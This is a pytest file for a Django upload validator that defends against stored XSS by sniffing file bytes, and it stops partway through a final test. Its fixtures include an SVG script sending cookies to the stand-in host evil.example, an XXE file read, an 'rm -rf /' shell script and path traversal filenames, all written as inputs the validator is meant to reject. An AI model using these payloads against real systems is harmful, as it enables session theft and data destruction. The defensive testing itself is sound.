"""
The  upload type allowlist, end to end against real Postgres.

The vulnerability these cover: an `.svg` (or `.html`) upload was stored with
its extension intact, django-storages derived the served `Content-Type` from
that name (`mimetypes.guess_type`), and nginx proxied it inline from
https://free2z.cash with no `Content-Disposition` — so `<script>` inside it
ran in the cookie-bearing origin, as the visitor.

The invariant asserted below: the *bytes* decide the type, the *stored
extension* is always rewritten to match them, and both the extension and the
client's declared Content-Type are rejected outright when they name a type
that is not on an allowlist of passive media. An attacker controls the
filename and the declared type completely; the bytes are the only honest
signal.

File storage is redirected to a tmp dir (default storage in settings is GCS;
only that external boundary is swapped, per repo test rules).
"""
import json
import mimetypes
from io import BytesIO, StringIO

import pytest
from PIL import Image

from django.core.files.base import ContentFile
from django.core.files.uploadedfile import SimpleUploadedFile
from django.core.validators import FileExtensionValidator
from django.core.management import call_command
from django.urls import reverse

from dj.apps.uploads.models import GenericFile, get_upload_path
from dj.apps.uploads.validation import (
    ACTIVE_MIME_TYPES,
    ALLOWED_TYPE_EXTENSIONS,
    DECLARED_TYPE_ALIASES,
    EXTENSION_TO_TYPE,
    UploadTypeError,
    sniff_media_type,
    validate_upload,
)


@pytest.fixture(autouse=True)
def _local_media(settings, tmp_path):
    settings.STORAGES = {
        **settings.STORAGES,
        "default": {
            "BACKEND": "django.core.files.storage.FileSystemStorage",
        },
    }
    settings.MEDIA_ROOT = str(tmp_path)


# ---------------------------------------------------------------------------
# Sample payloads
# ---------------------------------------------------------------------------

def _raster_bytes(fmt, size=(8, 8)):
    image = Image.new("RGB", size, (10, 120, 200))
    out = BytesIO()
    image.save(out, format=fmt)
    return out.getvalue()


PNG = _raster_bytes("PNG")
JPEG = _raster_bytes("JPEG")
GIF = _raster_bytes("GIF")
WEBP = _raster_bytes("WEBP")


def _mpo_bytes():
    """
    A JPEG carrying a valid APP2 MPF segment — what dual-camera / portrait /
    HDR phones emit (iPhone, Samsung, WhatsApp re-encodes). Pillow reports
    format 'MPO', not 'JPEG', for these. On a 512-file corpus of real JPEGs,
    6.4% were MPO; requiring an exact 'JPEG' 400s all of them on the main
    upload path with "your photo is corrupt".
    """
    first = Image.new("RGB", (8, 8), (10, 120, 200))
    second = Image.new("RGB", (8, 8), (200, 20, 10))
    out = BytesIO()
    first.save(out, format="MPO", save_all=True, append_images=[second])
    return out.getvalue()


MPO = _mpo_bytes()

# HEIF/AVIF: ISO-BMFF with their own unambiguous brands. These fixtures test
# brand identification, not decodability: the explicit _PILLOW_FORMATS policy
# excludes these types from second-stage confirmation regardless of codecs.
def _iso_bmff(major: bytes, compatible: bytes = b'mif1') -> bytes:
    """
    A bare `ftyp` box: 4-byte size, 'ftyp', 4-byte major brand, 4-byte minor
    version, then the compatible-brand list. 0x18 == 24 bytes covers a
    two-entry list, which is what every real HEIF header carries.
    """
    assert len(major) == len(compatible) == 4
    return (
        b'\x00\x00\x00\x18ftyp' + major + b'\x00\x00\x00\x00'
        + major + compatible + b'\x00' * 64
    )


HEIC = _iso_bmff(b'heic')
AVIF = _iso_bmff(b'avif', b'avif')

# Exactly the brands IANA registers across image/heic, image/heic-sequence,
# image/heif and image/heif-sequence. `heic`/`heix` are what an iPhone stamps on
# a still; `mif1` is what Canon and Fujifilm write; the rest are the
# 10-bit/alpha, sequence and MIAF variants. All ten are one canonical label for
# us — a passive raster served from a `.heic`/`.heif` name.
HEIF_BRANDS = (b'heic', b'heix', b'heim', b'heis',
               b'hevc', b'hevx', b'hevm', b'hevs',
               b'mif1', b'msf1')

# The actual  payload.
EVIL_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg">'
    b'<script>fetch("https://evil.example/"+document.cookie)</script>'
    b'</svg>'
)
EVIL_HTML = (
    b'<!doctype html><html><body><script>alert(document.domain)</script>'
    b'</body></html>'
)

# Minimal but honest containers. We never decode video/audio/pdf, we only
# identify them, so a valid header is the whole story.
MP4 = (
    b'\x00\x00\x00\x20ftypisom\x00\x00\x02\x00'
    b'isomiso2avc1mp41' + b'\x00' * 64
)
MP3 = b'ID3\x04\x00\x00\x00\x00\x00\x00' + b'\xff\xfb\x90\x00' + b'\x00' * 64
# Audio-only AAC as ffmpeg actually writes it: identical `isom` major brand to
# the video above. The `ftyp` box genuinely cannot tell these apart.
M4A = (
    b'\x00\x00\x00\x20ftypisom\x00\x00\x02\x00'
    b'isomiso2mp41M4A ' + b'\x00' * 64
)
MOV = b'\x00\x00\x00\x14ftypqt  \x00\x00\x02\x00qt  ' + b'\x00' * 64
PDF = (
    b'%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n'
    b'%%EOF\n'
)


def _upload(name, content, content_type):
    return SimpleUploadedFile(name, content, content_type=content_type)


# ---------------------------------------------------------------------------
# Sniffing
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload,expected", [
    (PNG, "image/png"),
    (JPEG, "image/jpeg"),
    (MPO, "image/jpeg"),
    (GIF, "image/gif"),
    (WEBP, "image/webp"),
    (HEIC, "image/heic"),
    (AVIF, "image/avif"),
    (MP4, "video/mp4"),
    (MP3, "audio/mpeg"),
    (PDF, "application/pdf"),
])
def test_sniffer_identifies_allowlisted_formats(payload, expected):
    assert sniff_media_type(payload) == expected


@pytest.mark.parametrize("payload", [
    EVIL_SVG,
    EVIL_HTML,
    b'<?xml version="1.0"?><root/>',
    b'<!ENTITY xxe SYSTEM "file:///etc/passwd">',
    b'PK\x03\x04' + b'\x00' * 32,          # zip / docx / jar
    b'#!/bin/sh\nrm -rf /\n',
    b'',
    b'\xff\xff\xff\xff',                    # not an mp3 frame sync
])
def test_sniffer_refuses_everything_else(payload):
    """
    Fail closed. Text formats have no binary signature, so they can never be
    identified — which is exactly the property that keeps SVG/HTML out.
    """
    assert sniff_media_type(payload) is None


# ---------------------------------------------------------------------------
# validate_upload — the unit the views call
# ---------------------------------------------------------------------------

def test_svg_with_script_is_rejected():
    with pytest.raises(UploadTypeError):
        validate_upload(_upload("evil.svg", EVIL_SVG, "image/svg+xml"))


def test_html_is_rejected():
    with pytest.raises(UploadTypeError):
        validate_upload(_upload("evil.html", EVIL_HTML, "text/html"))


def test_svg_bytes_renamed_to_png_are_still_rejected():
    """
    Renaming the payload does not launder it: the bytes are what we look at,
    and SVG bytes are not identifiable as any allowlisted type.
    """
    with pytest.raises(UploadTypeError):
        validate_upload(_upload("cat.png", EVIL_SVG, "image/png"))


def test_png_bytes_declared_as_svg_are_rejected():
    """
    The other direction: honest bytes, hostile declaration. Nothing would be
    stored as an active type either way — the bytes decide — but a client
    asserting a type we do not serve is a cheap tripwire worth tripping.
    """
    with pytest.raises(UploadTypeError):
        validate_upload(_upload("cat.png", PNG, "image/svg+xml"))


def test_png_bytes_named_svg_are_rejected():
    """
    The stored extension is what becomes the served Content-Type. A PNG named
    `.svg` would be served as `image/svg+xml`, so it must not be stored under
    that name — and quietly rewriting an obviously misleading name would hide
    an attack rather than surface it.
    """
    with pytest.raises(UploadTypeError):
        validate_upload(_upload("cat.svg", PNG, "image/png"))


@pytest.mark.parametrize("name,payload,declared,expected_name,expected_type", [
    # The real-world case: a screenshot saved as `cat.png` that is actually
    # JPEG bytes. The browser derives its declaration from the extension, so
    # both the extension AND the declaration disagree with the bytes — and
    # neither disagreement is hostile. 3 of 512 files in a real corpus.
    ("cat.png", JPEG, "image/png", "cat.jpg", "image/jpeg"),
    ("cat.png", GIF, "image/png", "cat.gif", "image/gif"),
    ("cat.jpg", PNG, "image/jpeg", "cat.png", "image/png"),
])
def test_mismatch_between_two_passive_allowed_types_is_normalized_not_rejected(
        name, payload, declared, expected_name, expected_type):
    """
    Both types are allowlisted and passive, and we rewrite the extension
    anyway — so 400ing an honest user buys nothing. Drop their extension and
    use ours; the stored name still agrees with the bytes, which is the whole
    invariant. The hard reject is reserved for names that assert an *active*
    type (see the.svg/.html cases).
    """
    upload = _upload(name, payload, declared)
    assert validate_upload(upload) == expected_type
    assert upload.name == expected_name


@pytest.mark.parametrize("name,payload,expected", [
    ("photo.heic", HEIC, "image/heic"),
    ("photo.heif", HEIC, "image/heic"),
    ("photo.avif", AVIF, "image/avif"),
])
def test_modern_phone_formats_are_accepted(name, payload, expected):
    """
    `accept` is a hint, not a gate — any API client can send these, and iOS
    only transcodes by default. Both are passive rasters with unambiguous
    ISO-BMFF brands.
    """
    assert validate_upload(_upload(name, payload, "")) == expected


# ---------------------------------------------------------------------------
# The HEIF family
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("brand", HEIF_BRANDS)
def test_every_heif_brand_is_identified(brand):
    """
    One container, eight brands, one label. An iPhone stamps `heic` or `heix`;
    Canon/Fujifilm write `mif1`; the sequence brands are `hevc`/`hevx`/`msf1`.
    Dropping any of them from `_FTYP_BRANDS` would 400 an honest camera photo
    with "this file type is not allowed", so the whole set is pinned here.
    """
    assert sniff_media_type(_iso_bmff(brand)) == "image/heic"


@pytest.mark.parametrize("declared", [
    # THE  BUG: what the standard Linux/Android mime.types gives a client
    # for a `.heif` file. iOS/Safari says `image/heic`, which is the only
    # reason the false rejection was not loud.
    "image/heif",
    "image/heic",
    "image/x-heic",
    "image/x-heif",
    "image/heic-sequence",
    "image/heif-sequence",
    "application/octet-stream",
    "",
])
def test_heif_is_accepted_however_the_client_spells_the_type(declared):
    """
    The bytes decide, and these bytes are an allowlisted passive raster. The
    client's *spelling* of an already-allowed type must not turn an honest
    upload into a 400 — this rejected iPhone photos on the public upload path
    and blocked KYC applicants from submitting an identity document.
    """
    upload = _upload("p.heif", HEIC, declared)
    assert validate_upload(upload) == "image/heic"
    # The stored extension is preserved (it already denotes image/heic)...
    assert upload.name == "p.heif"
    #...and django-storages derives the served Content-Type from exactly this
    # name, so the object lands in GCS as image/heic, not
    # application/octet-stream.
    assert mimetypes.guess_type(upload.name)[0] == "image/heic"


def test_avif_sequence_spelling_is_accepted():
    upload = _upload("p.avif", AVIF, "image/avif-sequence")
    assert validate_upload(upload) == "image/avif"
    assert mimetypes.guess_type(upload.name)[0] == "image/avif"


@pytest.mark.parametrize("major,compatible,expected", [
    # Codex review finding: `mif1`/`msf1` are MIAF brands, not codec brands. An
    # AV1-coded file is a conforming HEIF and encoders ship it with `mif1` as
    # the MAJOR brand and `avif` only in the compatible list. Reading the major
    # brand alone labelled it image/heic and renamed it `.heic`.
    (b'mif1', b'avif', "image/avif"),
    (b'msf1', b'avis', "image/avif"),
    (b'mif1', b'heic', "image/heic"),
    # No codec brand to be had: fall back to the major brand rather than
    # rejecting a file we would otherwise have accepted.
    (b'mif1', b'mif1', "image/heic"),
    (b'mif1', b'\x00\x00\x00\x00', "image/heic"),
    # A specific major brand is never second-guessed.
    (b'heic', b'mif1', "image/heic"),
    (b'avif', b'mif1', "image/avif"),
])
def test_generic_miaf_brands_are_refined_from_the_compatible_list(
        major, compatible, expected):
    assert sniff_media_type(_iso_bmff(major, compatible)) == expected


def test_an_av1_coded_heif_keeps_its_avif_name_and_served_type():
    """
    End to end for the same finding: the whole point of getting the label right
    is that the stored extension — and therefore the Content-Type GCS serves —
    follows it.
    """
    upload = _upload("photo.avif", _iso_bmff(b'mif1', b'avif'), "image/heif")
    assert validate_upload(upload) == "image/avif"
    assert upload.name == "photo.avif"
    assert mimetypes.guess_type(upload.name)[0] == "image/avif"


@pytest.mark.parametrize("compatible", [b'isom', b'mp41', b'M4A ', b'qt  '])
def test_miaf_refinement_can_never_turn_a_still_image_into_av_media(compatible):
    """
    The refinement reads an attacker-supplied brand list, so it is restricted
    to the two image labels. A stray `isom` in a HEIF's compatible list must
    not manufacture `video/mp4` — that would drop the file into
    ISO_BMFF_FAMILY, where the *extension* gets to pick the label.
    """
    assert sniff_media_type(_iso_bmff(b'mif1', compatible)) == "image/heic"


@pytest.mark.parametrize("head", [
    # size 0 ("to end of file") and 1 (64-bit extended) have no business on an
    # ftyp box; a size past the sniff window cannot be trusted either.
    b'\x00\x00\x00\x00ftypmif1\x00\x00\x00\x00avif' + b'\x00' * 32,
    b'\x00\x00\x00\x01ftypmif1\x00\x00\x00\x00avif' + b'\x00' * 32,
    b'\xff\xff\xff\xffftypmif1\x00\x00\x00\x00avif' + b'\x00' * 32,
    # Truncated: the box claims 24 bytes but only 20 are present.
    b'\x00\x00\x00\x18ftypmif1\x00\x00\x00\x00',
])
def test_miaf_refinement_survives_a_malformed_box_header(head):
    """Fall back to the major brand; never raise, never reject."""
    assert sniff_media_type(head) == "image/heic"


@pytest.mark.parametrize("name,payload", [
    ("p.heif", EVIL_SVG),
    ("p.heic", EVIL_SVG),
    ("p.heif", EVIL_HTML),
    ("p.heif", b'<?xml version="1.0"?><root/>'),
    ("evil.svg", EVIL_SVG),
    ("evil.html", EVIL_HTML),
])
def test_declaring_heif_does_not_launder_an_active_document(name, payload):
    """
    The point of  is a *spelling* fix, not a hole. `image/heif` normalizing
    to `image/heic` only silences the declared-type tripwire; it never touches
    the sniffer, and SVG/HTML/XML have no binary signature, so they still fail
    the first and only check that decides the type.
    """
    with pytest.raises(UploadTypeError):
        validate_upload(_upload(name, payload, "image/heif"))


# ---------------------------------------------------------------------------
# HEIF / AVIF image *sequences*
#
#  taught the sniffer the sequence brands and the declared-type table the
# `-sequence` spellings, but left the registered *extensions* off
# ALLOWED_TYPE_EXTENSIONS. `.heics` and `.heifs` resolve on the Debian base
# image (python:3.10-bullseye then; via /etc/mime.types), so `validate_upload`'s
# "this extension names some other format" branch turned an honest
# `burst.heics` into a hard 400 — not a silent rename — even though its bytes
# sniffed correctly and its declared type was already aliased.
# ---------------------------------------------------------------------------

# `hevc` is the HEVC image-sequence brand [image/heic-sequence]; `msf1` is the
# codec-agnostic MIAF sequence brand [image/heif-sequence]; `avis` is the AV1
# one [image/avif-sequence]. All three are already in `_FTYP_BRANDS`.
HEIC_SEQUENCE = _iso_bmff(b'hevc')
HEIF_SEQUENCE = _iso_bmff(b'msf1')
AVIF_SEQUENCE = _iso_bmff(b'avis', b'avis')


@pytest.mark.parametrize("name,payload,declared,expected", [
    # THE  BUG, in the three spellings a client actually sends: the
    # extension and the declared type both say "sequence", the bytes agree,
    # and every one of them used to 400.
    ("burst.heics", HEIC_SEQUENCE, "image/heic-sequence", "image/heic"),
    ("burst.heifs", HEIF_SEQUENCE, "image/heif-sequence", "image/heic"),
    ("burst.avifs", AVIF_SEQUENCE, "image/avif-sequence", "image/avif"),
    # A client whose MIME database does not know the extension sends nothing,
    # or the still spelling. Neither is a conflict.
    ("burst.heics", HEIC_SEQUENCE, "", "image/heic"),
    ("burst.heifs", HEIC_SEQUENCE, "image/heic", "image/heic"),
    ("burst.avifs", AVIF_SEQUENCE, "application/octet-stream", "image/avif"),
])
def test_sequence_extensions_are_accepted_and_preserved(
        name, payload, declared, expected):
    upload = _upload(name, payload, declared)
    assert validate_upload(upload) == expected
    # Neither rejected nor rewritten: the extension already denotes the
    # canonical label for these bytes.
    assert upload.name == name
    # And django-storages derives the served Content-Type from exactly this
    # name, so the header, the DB `mime_type` column and the API all report
    # the same string — `image/heic`, not the `/etc/mime.types` spelling
    # `image/heic-sequence`, which is not an allowlist member at all.
    assert mimetypes.guess_type(upload.name)[0] == expected


def test_sequence_extensions_map_to_the_still_labels_and_never_become_default():
    """
     added four *names*, not a new type: no new key in
    ALLOWED_TYPE_EXTENSIONS, so no new MIME_TYPE_CHOICES entry and no new
    accepted byte signature. And the canonical fallback — the extension
    `validate_upload` stores when the uploaded name has no usable one — is
    still the *still-image* extension, so nothing starts being stored as a
    sequence by accident.
    """
    assert EXTENSION_TO_TYPE['.heics'] == 'image/heic'
    assert EXTENSION_TO_TYPE['.heifs'] == 'image/heic'
    assert EXTENSION_TO_TYPE['.avifs'] == 'image/avif'
    assert ALLOWED_TYPE_EXTENSIONS['image/heic'][0] == '.heic'
    assert ALLOWED_TYPE_EXTENSIONS['image/avif'][0] == '.avif'


@pytest.mark.parametrize("name", [
    "burst.svg", "burst.html", "burst.xml", "burst.tif", "burst.zip",
])
def test_widening_to_sequences_did_not_widen_anything_else(name):
    """
    Guard against over-widening from the other direction: perfectly good
    sequence *bytes* under an extension we still do not own must still be a
    hard 400, exactly as before. `.tif` and `.zip` are the interesting ones —
    passive, harmless formats that are nevertheless off the allowlist.
    """
    with pytest.raises(UploadTypeError):
        validate_upload(_upload(name, HEIC_SEQUENCE, "image/heic-sequence"))


@pytest.mark.parametrize("name", ["burst.heics", "burst.heifs", "burst.avifs"])
@pytest.mark.parametrize("payload", [EVIL_SVG, EVIL_HTML])
def test_a_sequence_extension_cannot_launder_an_active_document(name, payload):
    """
    Same argument as 's: the new extensions only ever *survive* a file the
    sniffer already identified. They cannot make an unsniffable text format
    acceptable, because `resolved` starts life as the sniffed type.
    """
    with pytest.raises(UploadTypeError):
        validate_upload(_upload(name, payload, "image/heic-sequence"))


@pytest.mark.parametrize("ext", ["heics", "heifs", "avifs"])
def test_the_model_field_validator_gained_the_sequence_extensions(ext):
    """
    The reason  needed a migration in two apps: `ALLOWED_EXTENSIONS` is
    frozen into `FileExtensionValidator` on `GenericFile.file` (and on four
    `kyc.UserProfile` fields). This asserts the model side actually moved —
    without it the admin's ModelForm would still reject a `.heics` that the
    API accepts.
    """
    field = GenericFile._meta.get_field("file")
    validators = [
        v for v in field.validators
        if isinstance(v, FileExtensionValidator)
    ]
    assert len(validators) == 1
    allowed = validators[0].allowed_extensions
    assert ext in allowed
    #...and the active-document extensions are still absent.
    assert not {'svg', 'html', 'xml'} & set(allowed)


def test_declared_type_aliases_cannot_widen_the_allowlist():
    """
    A structural guard on the alias table. Every alias must resolve to a
    canonical allowlist entry, and no alias key may be a spelling of an active
    document type — `'image/svg+xml': 'image/png'` would silently disarm the
    tripwire that  put there.
    """
    unknown = {
        alias: target for alias, target in DECLARED_TYPE_ALIASES.items()
        if target not in ALLOWED_TYPE_EXTENSIONS
    }
    assert not unknown, f"aliases pointing off the allowlist: {unknown}"

    active_aliases = set(DECLARED_TYPE_ALIASES) & set(ACTIVE_MIME_TYPES)
    assert not active_aliases, f"active types aliased in: {active_aliases}"

    # An alias is a rename, never a redefinition of a canonical type.
    shadowed = set(DECLARED_TYPE_ALIASES) & set(ALLOWED_TYPE_EXTENSIONS)
    assert not shadowed, f"aliases shadowing canonical types: {shadowed}"


@pytest.mark.parametrize("name,payload,declared,expected", [
    ("cat.png", PNG, "image/png", "image/png"),
    ("cat.jpg", JPEG, "image/jpeg", "image/jpeg"),
    ("cat.jpeg", JPEG, "image/jpg", "image/jpeg"),          # browser alias
    # A phone photo with an APP2 MPF segment. Pillow calls this 'MPO'.
    ("IMG_8879.jpeg", MPO, "image/jpeg", "image/jpeg"),
    ("20260319_105505.jpg", MPO, "image/jpeg", "image/jpeg"),
    ("cat.gif", GIF, "image/gif", "image/gif"),
    ("cat.webp", WEBP, "image/webp", "image/webp"),
    ("clip.mp4", MP4, "video/mp4", "video/mp4"),
    ("song.mp3", MP3, "audio/mp3", "audio/mpeg"),           # browser alias
    ("form.pdf", PDF, "application/pdf", "application/pdf"),
    # A browser that cannot identify the file makes no claim.
    ("cat.png", PNG, "application/octet-stream", "image/png"),
    ("cat.png", PNG, "", "image/png"),
])
def test_legitimate_uploads_are_accepted(name, payload, declared, expected):
    upload = _upload(name, payload, declared)
    assert validate_upload(upload) == expected


@pytest.mark.parametrize("name,declared,expected", [
    ("song.m4a", "audio/mp4", "audio/mp4"),
    ("song.m4a", "audio/x-m4a", "audio/mp4"),
    ("song.m4a", "application/octet-stream", "audio/mp4"),
    ("song.m4a", "", "audio/mp4"),
    ("clip.mp4", "video/mp4", "video/mp4"),
    ("clip.m4v", "video/mp4", "video/mp4"),
])
def test_iso_bmff_audio_and_video_share_a_brand_and_both_are_accepted(
        name, declared, expected):
    """
    An audio-only AAC file carries major brand `isom`, exactly like a video
    MP4. Rejecting `.m4a` on that basis would 400 an explicitly allowed format
    (codex review finding 4). Inside the ISO-BMFF family the extension picks
    the label — every member is passive media, so nothing about  changes.
    """
    upload = _upload(name, M4A, declared)
    assert validate_upload(upload) == expected
    assert upload.name == name


def test_quicktime_brand_is_still_identified():
    upload = _upload("clip.mov", MOV, "video/quicktime")
    assert validate_upload(upload) == "video/quicktime"


def test_iso_bmff_relaxation_does_not_extend_outside_the_family():
    """
    The family exception is narrow. Inside it the extension *decides* the type
    (`.m4a` on `isom` bytes -> audio/mp4). Outside it the extension decides
    nothing — the bytes win and the name is rewritten to match, so an MP4
    named `.png` is stored `.mp4` and served video/mp4, never image/png.
    """
    inside = _upload("song.m4a", M4A, "")
    assert validate_upload(inside) == "audio/mp4"
    assert inside.name == "song.m4a"

    outside = _upload("clip.png", MP4, "image/png")
    assert validate_upload(outside) == "video/mp4"
    assert outside.name == "clip.mp4"


def test_upload_position_is_reset_so_the_bytes_still_store():
    upload = _upload("cat.png", PNG, "image/png")
    validate_upload(upload)
    assert upload.read() == PNG


def test_unknown_extension_is_normalized_to_the_sniffed_type():
    upload = _upload("screenshot", PNG, "image/png")
    assert validate_upload(upload) == "image/png"
    assert upload.name == "screenshot.png"


def test_uppercase_extension_is_lowercased():
    upload = _upload("CAT.PNG", PNG, "image/png")
    validate_upload(upload)
    assert upload.name == "CAT.png"


def test_empty_file_is_rejected():
    with pytest.raises(UploadTypeError):
        validate_upload(_upload("empty.png", b"", "image/png"))


def test_truncated_png_header_is_rejected_by_pillow_confirmation():
    """
    A file that merely *starts* like a PNG is not a PNG. The signature is
    eight bytes; Pillow has to agree before we accept it.
    """
    with pytest.raises(UploadTypeError):
        validate_upload(
            _upload("x.png", b'\x89PNG\r\n\x1a\n' + b'not really', "image/png")
        )


def test_rejection_message_is_user_safe_and_present():
    with pytest.raises(UploadTypeError) as excinfo:
        validate_upload(_upload("evil.svg", EVIL_SVG, "image/svg+xml"))
    assert excinfo.value.detail
    assert "not allowed" in excinfo.value.detail


# ---------------------------------------------------------------------------
# get_upload_path — no path traversal, no unsanitized extension
# ---------------------------------------------------------------------------

class _Owner:
    def __init__(self, username):
        self.username = username


class _Instance:
    def __init__(self, username):
        self.owner = _Owner(username)


@pytest.mark.parametrize("filename", [
    "../../../../etc/passwd.png",
    "..%2f..%2fevil.png",
    "/absolute/path.png",
    "dir/sub/pic.png",
    "pic.png/../../evil",
    "pic.p/n/g",
    "....//....//pic.png",
])
def test_get_upload_path_never_escapes_the_owner_directory(filename):
    path = get_upload_path(_Instance("kevin"), filename)
    assert path.startswith("kevin/")
    # Exactly one separator: `<username>/<name>`, nothing below or beside it.
    assert path.count("/") == 1
    assert ".." not in path


@pytest.mark.parametrize("filename,expected_ext", [
    ("pic.png", ".png"),
    ("pic.PNG", ".png"),
    ("pic.png ", ".png"),
    ("pic.p n g", ".png"),
    ("pic.<script>", ".script"),
    ("pic.", ""),
    ("pic", ""),
])
def test_get_upload_path_sanitizes_the_extension(filename, expected_ext):
    """
    The extension was the one part of the stored name that was never
    sanitized, and it is the part that decides the served Content-Type.
    """
    path = get_upload_path(_Instance("kevin"), filename)
    assert path.endswith(expected_ext)
    assert path.startswith("kevin/pic")


def test_get_upload_path_never_produces_a_dotfile():
    # slugify() strips a name made entirely of non-ASCII/punctuation, which
    # used to yield `kevin/.png`.
    assert get_upload_path(_Instance("kevin"), "!!!.png") == "kevin/file.png"


# ---------------------------------------------------------------------------
# The HTTP surface
# ---------------------------------------------------------------------------

@pytest.mark.django_db(transaction=True)
def test_single_public_upload_rejects_svg_with_a_clean_400(
        client, creator_factory):
    creator = creator_factory(username="kevin")
    client.force_login(creator)

    response = client.post(
        reverse("uploads_single_public"),
        {"title": "cat", "access": "public",
         "file": _upload("evil.svg", EVIL_SVG, "image/svg+xml")},
    )

    assert response.status_code == 400
    assert response.json()["detail"]
    assert not GenericFile.objects.exists()


@pytest.mark.django_db(transaction=True)
@pytest.mark.parametrize("name,payload,declared", [
    ("evil.svg", EVIL_SVG, "image/svg+xml"),
    ("evil.html", EVIL_HTML, "text/html"),
    ("evil.xhtml", EVIL_HTML, "application/xhtml+xml"),
    ("cat.png", EVIL_SVG, "image/png"),        # payload wearing a png name
    ("cat.svg", PNG, "image/svg+xml"),         # png wearing an svg name
    ("cat.png", PNG, "image/svg+xml"),         # png declared as svg
    #  made `image/heif` an accepted declaration. It must not become a
    # way to smuggle an active document past the tripwire.
    ("evil.heif", EVIL_SVG, "image/heif"),
    ("evil.svg", EVIL_SVG, "image/heif"),
])
def test_uploads_handle_rejects_active_documents(
        client, creator_factory, name, payload, declared):
    creator = creator_factory(username="kevin")
    client.force_login(creator)

    response = client.post(
        reverse("uploads_handle"),
        {
            "body": '[{"title": "x", "access": "public"}]',
            "files": _upload(name, payload, declared),
        },
    )

    assert response.status_code == 400
    assert not GenericFile.objects.exists()


@pytest.mark.django_db(transaction=True)
@pytest.mark.parametrize("name,payload,declared,expected", [
    ("cat.png", PNG, "image/png", "image/png"),
    ("cat.jpg", JPEG, "image/jpeg", "image/jpeg"),
    ("cat.gif", GIF, "image/gif", "image/gif"),
    ("clip.mp4", MP4, "video/mp4", "video/mp4"),
    ("song.mp3", MP3, "audio/mpeg", "audio/mpeg"),
    ("form.pdf", PDF, "application/pdf", "application/pdf"),
    #a phone photo whose client derived `image/heif` from the system
    # MIME database rather than saying `image/heic` like Safari does.
    ("IMG_0042.heif", HEIC, "image/heif", "image/heic"),
    ("IMG_0042.heic", HEIC, "image/heic", "image/heic"),
    #a HEIF image sequence, all the way through the real view. Used to
    # be a 400 on the extension alone.
    ("IMG_0043.heics", HEIC_SEQUENCE, "image/heic-sequence", "image/heic"),
    ("IMG_0043.heifs", HEIF_SEQUENCE, "image/heif-sequence", "image/heic"),
    ("IMG_0043.avifs", AVIF_SEQUENCE, "image/avif-sequence", "image/avif"),
])
def test_uploads_handle_still_accepts_legitimate_media(
        client, creator_factory, name, payload, declared, expected):
    creator = creator_factory(username="kevin")
    client.force_login(creator)

    response = client.post(
        reverse("uploads_handle"),
        {
            "body": '[{"title": "x", "access": "public"}]',
            "files": _upload(name, payload, declared),
        },
    )

    assert response.status_code == 201, response.content
    payload_json = response.json()
    assert payload_json[0]["mime_type"] == expected
    stored = GenericFile.objects.get(id=payload_json[0]["id"])
    assert stored.mime_type == expected
    assert stored.file.name.startswith("kevin/")


@pytest.mark.django_db(transaction=True)
def test_a_batch_is_all_or_nothing(client, creator_factory):
    """
    One hostile file must not ride along beside good ones — validate the
    whole batch before saving any of it.
    """
    creator = creator_factory(username="kevin")
    client.force_login(creator)

    response = client.post(
        reverse("uploads_handle"),
        {
            "body": '[{"title": "ok", "access": "public"}, '
                    '{"title": "bad", "access": "public"}]',
            "files": [
                _upload("cat.png", PNG, "image/png"),
                _upload("evil.svg", EVIL_SVG, "image/svg+xml"),
            ],
        },
    )

    assert response.status_code == 400
    assert not GenericFile.objects.exists()


@pytest.mark.django_db(transaction=True)
def test_stored_mime_type_comes_from_the_bytes_not_the_client(
        client, creator_factory):
    """
    `mime_type` used to be `file.content_type` verbatim — a value the browser
    (or an attacker with curl) chooses.
    """
    creator = creator_factory(username="kevin")
    client.force_login(creator)

    # An off-allowlist claim is hostile and rejected outright.
    response = client.post(
        reverse("uploads_single_public"),
        {"title": "cat", "access": "public",
         "file": _upload("cat.png", PNG, "image/svg+xml")},
    )
    assert response.status_code == 400

    # A merely *wrong* claim loses to the bytes rather than 400ing.
    response = client.post(
        reverse("uploads_single_public"),
        {"title": "cat", "access": "public",
         "file": _upload("cat.jpg", PNG, "image/jpeg")},
    )
    assert response.status_code == 201
    assert response.json()["mime_type"] == "image/png"

    response = client.post(
        reverse("uploads_single_public"),
        {"title": "cat", "access": "public",
         "file": _upload("cat.png", PNG, "application/octet-stream")},
    )
    assert response.status_code == 201
    assert response.json()["mime_type"] == "image/png"


@pytest.mark.django_db(transaction=True)
@pytest.mark.parametrize("name", [
    "IMG_8879.jpeg", "20260319_105505.jpg", "15417.jpg",
])
def test_phone_photos_with_an_mpf_segment_upload_successfully(
        client, creator_factory, name):
    """
    Regression for the one blocker adversarial review found: Pillow reports
    'MPO' for a JPEG with a valid APP2 MPF segment — every dual-camera /
    portrait / HDR phone photo — and an exact `format == 'JPEG'` check 400'd
    6.4% of a real 512-file JPEG corpus on the primary upload path.

    This goes through `single_public_upload_handle`, which also runs
    `try_strip_metadata` -> `remove_exif_data` for image/jpeg, so it covers
    the Pillow save/round-trip of an MPO as well as the accept decision.
    """
    creator = creator_factory(username="kevin")
    client.force_login(creator)

    response = client.post(
        reverse("uploads_single_public"),
        {"title": "photo", "access": "public",
         "file": _upload(name, MPO, "image/jpeg")},
    )

    assert response.status_code == 201, response.content
    assert response.json()["mime_type"] == "image/jpeg"
    stored = GenericFile.objects.get(id=response.json()["id"])
    assert stored.file.name.startswith("kevin/")
    assert stored.file.name.endswith((".jpg", ".jpeg"))


@pytest.mark.django_db(transaction=True)
def test_uploads_require_authentication(client):
    for url in ("uploads_handle", "uploads_single_public"):
        response = client.post(reverse(url), {})
        # @login_required redirects anonymous callers; the point is that
        # nothing is created.
        assert response.status_code in (302, 401, 403)
    assert not GenericFile.objects.exists()


# ---------------------------------------------------------------------------
# Remediation command
# ---------------------------------------------------------------------------

@pytest.mark.django_db(transaction=True)
def test_audit_active_uploads_finds_legacy_rows_and_is_dry_run_by_default(
        creator_factory):
    creator = creator_factory(username="kevin")
    # Legacy rows: written before the allowlist, so they bypass it here the
    # same way they exist in production.
    legacy_svg = GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/svg+xml", access="public",
    )
    legacy_html = GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_HTML, name="evil.html"),
        mime_type="text/html", access="public",
    )
    ok = GenericFile.objects.create(
        owner=creator, file=ContentFile(PNG, name="cat.png"),
        mime_type="image/png", access="public",
    )

